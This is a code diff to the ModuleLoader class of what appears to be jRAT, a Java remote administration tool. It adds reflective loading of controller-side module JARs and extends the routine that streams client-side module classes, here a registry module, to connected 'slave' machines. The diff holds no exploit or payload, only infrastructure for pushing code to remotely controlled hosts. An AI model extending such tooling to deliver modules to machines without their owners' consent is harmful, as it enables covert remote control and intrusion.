@@ -1,10 +1,16 @@
 package io.jrat.controller.modules;
 
+import apiv2.ControllerModule;
 import io.jrat.common.Logger;
 import io.jrat.controller.AbstractSlave;
 
 import java.io.ByteArrayOutputStream;
+import java.io.File;
 import java.io.FileInputStream;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Method;
+import java.net.URL;
+import java.net.URLClassLoader;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.jar.JarEntry;
@@ -17,27 +23,58 @@ public class ModuleLoader {
      */
     private static class ModuleData {
 
+        public boolean controller;
         public String path;
         public String mainClass;
 
-        public ModuleData(String path, String mainClass) {
+        public ModuleData(boolean controller, String path, String mainClass) {
+            this.controller = controller;
             this.path = path;
             this.mainClass = mainClass;
         }
     }
 
+    private static final List<ModuleData> local = new ArrayList<ModuleData>();
     private static final List<ModuleData> modules = new ArrayList<ModuleData>();
 
     static {
-        modules.add(new ModuleData("test-client.jar", "test.TestStub"));
+        local.add(new ModuleData(true, "registry-controller.jar", "jrat.module.registry.RegistryControllerModule"));
+        modules.add(new ModuleData(false, "registry-client.jar", "jrat.module.registry.RegistryClientModule"));
     }
 
+    /**
+     * Load all server side modules
+     * @throws Exception
+     */
+    public static void load() throws Exception {
+        for (ModuleData mod : local) {
+            // add module JAR to classpath
+            Method method = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
+            method.setAccessible(true);
+            method.invoke(ClassLoader.getSystemClassLoader(), new Object[] { new File(mod.path).toURI().toURL() });
+
+            // invoke init() on module
+            Class<ControllerModule> clazz = (Class<ControllerModule>) ModuleLoader.class.getClassLoader().loadClass(mod.mainClass);
+            Constructor<?> ctor = clazz.getDeclaredConstructor(null);
+            ctor.setAccessible(true);
+            ControllerModule module = (ControllerModule) ctor.newInstance(null);
+            module.init();
+        }
+    }
+
+    /**
+     * Send all client side modules to the client
+     * @param slave
+     * @throws Exception
+     */
     public static void send(AbstractSlave slave) throws Exception {
+        Logger.log("Writing " + modules.size() + " modules...");
         slave.writeInt(modules.size());
 
         for (ModuleData mod : modules) {
-            Logger.log("Writing module " + mod.mainClass);
             slave.writeLine(mod.mainClass);
+
+            int total = 0;
 
             JarInputStream jis = new JarInputStream(new FileInputStream(mod.path));
             JarEntry entry;
@@ -59,6 +96,7 @@ public class ModuleLoader {
                 out.close();
 
                 byte[] array = out.toByteArray();
+                total += array.length;
 
                 Logger.log("\twriting class " + entry.getName() + " (" + array.length + " b)");
 
@@ -69,7 +107,9 @@ public class ModuleLoader {
             }
             jis.close();
 
+            // indicate that there are no entries left for this module
             slave.writeBoolean(false);
+            Logger.log("\twrote module '" + mod.mainClass + "' (" + total + " b)");
         }
     }
 }
